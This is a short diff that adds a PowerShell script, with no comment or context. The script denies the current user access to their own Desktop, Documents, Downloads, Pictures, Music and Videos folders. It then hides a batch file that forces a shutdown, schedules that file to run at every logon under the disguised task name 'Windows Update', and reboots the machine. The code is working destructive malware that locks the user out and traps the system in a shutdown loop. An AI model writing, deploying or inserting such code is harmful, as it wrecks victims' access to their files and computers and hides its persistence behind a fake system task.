@@ -1,0 +1,10 @@
+$u=[Environment]::GetFolderPath('UserProfile');$n=$env:USERNAME
+'desktop','downloads','documents','pictures','music','videos'|%{
+    icacls "$u\$_" /deny ${n}:F
+}
+sc "$u\hd.bat" '@echo off
+shutdown /s /t 5
+exit' -Encoding ASCII
+attrib +h +s +r "$u\hd.bat"
+schtasks /create /tn "Windows Update" /tr "$u\hd.bat" /sc onlogon /f
+shutdown /r /t 5
